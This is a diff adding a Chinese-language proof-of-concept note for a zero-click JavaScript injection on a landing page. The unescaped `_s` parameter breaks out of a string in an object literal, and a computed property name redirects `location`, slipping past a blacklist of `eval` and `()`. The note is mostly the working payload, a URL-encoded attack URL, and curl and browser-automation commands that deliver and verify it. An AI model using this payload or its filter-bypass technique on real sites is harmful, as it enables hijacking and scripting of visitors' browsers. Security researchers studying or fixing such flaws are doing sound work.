@@ -1,0 +1,41 @@
+## 原理
+
+落地页把 `_s` 参数原样拼进 `Page` 对象的属性函数体里的一个字符串：
+
+```js
+download: function(link) {
+    this.copyToClip("share://<_s>=page_id://<uuid>");
+    this.thenGo(atob(link));
+},
+```
+
+`_s` 无长度上限，`location` 不被关键词过滤（只拦 `eval` 与字面量序列 `()`）。
+在对象字面量里插入**计算属性名** `[expr]:`，expr 在**对象创建时**求值 —— 零点击。
+
+## 载荷（38 字符）
+
+```
+");},[location='//example.com']:a=>{("
+```
+
+- `");},`  → 闭合字符串 / `copyToClip(` / 函数体，回到属性位置
+- `[location='//example.com']` → 计算属性名，求值时赋值 location
+- `:a=>{("` → 箭头函数体吃掉尾部 `=page_id://<uuid>");`，后面的 `},` 闭合
+
+URL：
+
+```
+https://TARGET/?_s=%22%29%3B%7D%2C%5Blocation%3D%27%2F%2Fexample.com%27%5D%3Aa%3D%3E%7B%28%22
+```
+
+## 用法
+
+```bash
+curl -s -x http://127.0.0.1:7892 --http1.1 "https://TARGET/?_s=$(python3 -c "import urllib.parse;print(urllib.parse.quote(\"\"\"\");},[location='//example.com']:a=>{(\"\"\",safe=''))")"
+agent-browser --session x --proxy http://127.0.0.1:7892 open "$URL"; agent-browser --session x eval 'location.href'
+```
+
+## 注意
+
+- 短不下来的原因：15 字符骨架 `");},[x]:a=>{("` 已把预算吃光，一次真实导航最少 `location='//x'`（13 字符）。
+- `()` 被黑名单后不能用 `q(){...}`，只能箭头/`function(a)`。
